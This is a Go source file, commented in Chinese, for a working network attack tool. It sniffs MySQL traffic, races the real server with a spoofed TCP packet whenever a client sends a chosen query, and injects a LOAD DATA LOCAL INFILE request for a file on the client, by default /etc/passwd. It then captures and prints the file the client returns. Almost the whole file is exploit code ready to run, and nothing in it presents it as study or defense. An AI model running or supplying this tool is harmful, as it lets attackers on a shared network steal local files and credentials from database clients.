package main

import (
    "bytes"
    "encoding/binary"
    "flag"
    "fmt"
    "log"
    "net"
    "os"
    "os/signal"
    "sync"
    "syscall"

    "github.com/google/gopacket"
    "github.com/google/gopacket/layers"
    "github.com/google/gopacket/pcap"
)

// 嗅探mysql协议，当TCP payload匹配特定SQL语句时，发送抢答返回包，利用locad data local漏洞读取客户端本地文件

var etherName string
var sqlCode string
var fileName string

// 使用 sync.Map 来避免锁竞争
var ackNumbers sync.Map

// 重用序列化缓冲区，减少内存分配
var buffer gopacket.SerializeBuffer

const (
    mysqlPacketNumRequestFile = 0x01
    mysqlCommandQuery         = 0x03
    mysqlLocalInfileRequest   = 0xfb
)

// genSqlRsp 生成用于读取文件的MySQL响应包
func genSqlRsp() []byte {
    payloadLen := 1 + len(fileName)
    packetLen := 4 + payloadLen
    packet := make([]byte, packetLen)

    tempBuf := make([]byte, 4)
    binary.LittleEndian.PutUint32(tempBuf, uint32(payloadLen))
    copy(packet[0:3], tempBuf[0:3])

    packet[3] = mysqlPacketNumRequestFile
    packet[4] = mysqlLocalInfileRequest
    copy(packet[5:], []byte(fileName))

    return packet
}

// genSqlReq 根据输入的sql语句生成对应的MySQL请求包
func genSqlReq() []byte {
    payloadLen := 1 + len(sqlCode)
    packetLen := 4 + payloadLen
    packet := make([]byte, packetLen)

    tempBuf := make([]byte, 4)
    binary.LittleEndian.PutUint32(tempBuf, uint32(payloadLen))
    copy(packet[0:3], tempBuf[0:3])

    packet[3] = 0x00
    packet[4] = mysqlCommandQuery
    copy(packet[5:], []byte(sqlCode))

    return packet
}

// sendMysqlResponse 构造并发送一个伪造的MySQL响应包
func sendMysqlResponse(handle *pcap.Handle, srcMac net.HardwareAddr,
    srcIP net.IP, srcPort layers.TCPPort, dstMac net.HardwareAddr,
    dstIP net.IP, dstPort layers.TCPPort, Ack uint32, Seq uint32, response []byte) bool {

    options := gopacket.SerializeOptions{
        ComputeChecksums: true,
        FixLengths:       true,
    }

    ethernetLayer := &layers.Ethernet{
        SrcMAC:       dstMac,
        DstMAC:       srcMac,
        EthernetType: layers.EthernetTypeIPv4,
    }
    ipLayer := &layers.IPv4{
        Version:  4,
        TTL:      64,
        SrcIP:    dstIP,
        DstIP:    srcIP,
        Protocol: layers.IPProtocolTCP,
    }
    tcpLayer := &layers.TCP{
        SrcPort: dstPort,
        DstPort: srcPort,
        Seq:     Ack,
        Ack:     Seq,
        SYN:     false,
        ACK:     true,
        PSH:     true,
        Window:  1500,
    }
    err := tcpLayer.SetNetworkLayerForChecksum(ipLayer)
    if err != nil {
        log.Printf("设置校验和失败: %s\n", err)
        return false
    }

    // 重用缓冲区
    buffer.Clear()
    err = gopacket.SerializeLayers(buffer, options,
        ethernetLayer,
        ipLayer,
        tcpLayer,
        gopacket.Payload(response),
    )
    if err != nil {
        log.Printf("序列化数据包失败: %s\n", err)
        return false
    }
    outgoingPacket := buffer.Bytes()

    err = handle.WritePacketData(outgoingPacket)
    if err == nil {
        return true
    } else {
        log.Printf("发送数据包失败: %s\n", err)
        return false
    }
}

// processPacket 处理捕获到的数据包
func processPacket(packet gopacket.Packet, handle *pcap.Handle, sqlReq []byte, sqlResp []byte) {
    ethLayer := packet.Layer(layers.LayerTypeEthernet)
    ipLayer := packet.Layer(layers.LayerTypeIPv4)
    tcpLayer := packet.Layer(layers.LayerTypeTCP)
    payloadLayer := packet.ApplicationLayer()

    if ethLayer == nil || ipLayer == nil || tcpLayer == nil || payloadLayer == nil {
        return
    }

    eth := ethLayer.(*layers.Ethernet)
    ip4 := ipLayer.(*layers.IPv4)
    tcp := tcpLayer.(*layers.TCP)
    payload := payloadLayer.Payload()

    if len(payload) == 0 {
        return
    }

    // 尝试从 ackNumbers 中加载并删除，避免锁竞争
    _, loaded := ackNumbers.LoadAndDelete(tcp.Seq)
    if loaded {
        log.Printf("[mysql] [response] %s:%d ==> %s:%d \n", ip4.SrcIP, tcp.SrcPort, ip4.DstIP, tcp.DstPort)
        fmt.Printf("========== [SUCCESS] Captured File Content ==========\n")
        fmt.Printf("源端口: %d | 目的端口: %d\n", tcp.SrcPort, tcp.DstPort)
        fmt.Printf("Payload长度: %d 字节\n", len(payload))
        if len(payload) > 4 {
            fmt.Printf("\n%s\n", string(payload[4:]))
        }
        fmt.Println("=====================================================")
        return
    }

    if bytes.Equal(payload, sqlReq) {
        if sendMysqlResponse(handle, eth.SrcMAC, ip4.SrcIP, tcp.SrcPort, eth.DstMAC, ip4.DstIP, tcp.DstPort, tcp.Ack, tcp.Seq+uint32(len(payload)), sqlResp) {
            // 使用 Store 来存入新的序列号
            ackNumbers.Store(tcp.Seq+uint32(len(payload)), struct{}{})
            log.Printf("[mysql] [inject] %s:%d ==> %s:%d \n", ip4.DstIP, tcp.DstPort, ip4.SrcIP, tcp.SrcPort)
        }
    }
}

func init() {
    flag.StringVar(&etherName, "de", "eth0", "网卡名")
    flag.StringVar(&sqlCode, "sql", "select 1", "待劫持sql语句")
    flag.StringVar(&fileName, "file", "/etc/passwd", "待读取文件")
    flag.Parse()

    // 初始化全局缓冲区
    buffer = gopacket.NewSerializeBuffer()
}

func main() {
    device := etherName
    snapshotLen := int32(1024)
    timeout := pcap.BlockForever
    filter := "tcp dst port 3306"

    handle, err := pcap.OpenLive(device, snapshotLen, true, timeout)
    if err != nil {
        log.Fatal(err)
    }
    defer handle.Close()

    if err = handle.SetBPFFilter(filter); err != nil {
        log.Fatal(err)
    }

    var sqlReq = genSqlReq()
    var sqlResp = genSqlRsp()

    packetSource := gopacket.NewPacketSource(handle, handle.LinkType())

    sigc := make(chan os.Signal, 1)
    signal.Notify(sigc, syscall.SIGINT, syscall.SIGTERM)
    fmt.Printf("开始在网卡 %s 上监听\n", device)

    for {
        select {
        case packet := <-packetSource.Packets():
            if packet == nil {
                log.Println("数据包流已关闭")
                return
            }
            processPacket(packet, handle, sqlReq, sqlResp)
        case <-sigc:
            fmt.Println("\n收到退出信号，正在关闭...")
            return
        }
    }
}